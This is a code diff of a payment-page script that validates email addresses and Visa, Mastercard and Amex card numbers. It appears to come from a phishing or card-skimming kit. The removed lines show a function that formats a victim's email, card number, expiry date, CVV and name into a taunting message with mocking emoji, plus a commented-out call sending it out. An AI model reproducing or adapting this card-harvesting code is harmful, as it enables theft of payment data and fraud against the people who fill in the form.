@@ -9,16 +9,6 @@ $(document).ready( () => {
   const emailRegex = /^[-\w.%+]{1,64}@(?:[A-Z0-9-]{1,63}\.){1,125}[A-Z]{2,63}$/i
   const McVsRegex = /^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})$/i
   const AmexRegex = /^3[47][0-9]{13}$/i
-  
-const inptErr = (inpt) => {
-  [ mailInpt, ccInpt, ccvInpt, dteInpt, nameInpt ].forEach((el) => {
-    if(el.id == inpt) {
-      el.style.color = "#fe5555"
-    } else {
-      el.style.color = "#191b1e"
-    }
-  })
-}
 
 const txtDft = (inpt) => $(inpt).css('color', '#191b1e')
 const brdDft = (inpt) => $(inpt).css('borderColor', '#E5E5EA')
@@ -169,47 +159,12 @@ const inputValidation = () => {
     })
   }
   
-  const createMsg = (object) => {
-    const msg = `■■■■■🤣🫵🤡■■■■■
-📧 Email: ${object.email} 
-💳 Cc num: ${object.ccNum} 
-🗓 Exp: ${object.exp}
-🔑 Ccv: ${object.ccv}
-👤 Name: ${object.name}
-■■■■■■■■■■■■■■`;
-    return msg
-  }
-  
- /* $('.payBtn').click( () => {
-    const isValidated = inputValidation()
-    if(isValidated.validated) sender(createMsg(isValidated))
-  })*/
-  
-    const loading = document.getElementById('payment-loading');
-                const success = document.getElementById('payment-success');
-                const error = document.getElementById('payment-error');
-                const form = document.getElementById('payment-form');
-                const failed = document.getElementById('payment-failed');
-                const form_error = document.getElementById('payment-form-error');
-
-                function showContent(contentId) {
-                    [loading, success, error, form, failed, form_error].forEach((el) => {
-                        if (el.id === contentId) {
-                            el.classList.remove('hidden');
-                        } else {
-                            el.classList.add('hidden');
-                        }
-                    });
-                }
-  
  $('.payBtn').click( (e) => {
    e.preventDefault()
     const isValidated = inputValidation()
-    //if(isValidated.validated) sender(createMsg(isValidated))
     if(isValidated.validated) {
       $('form').submit()
     }
   })
-  
-  
+
 })
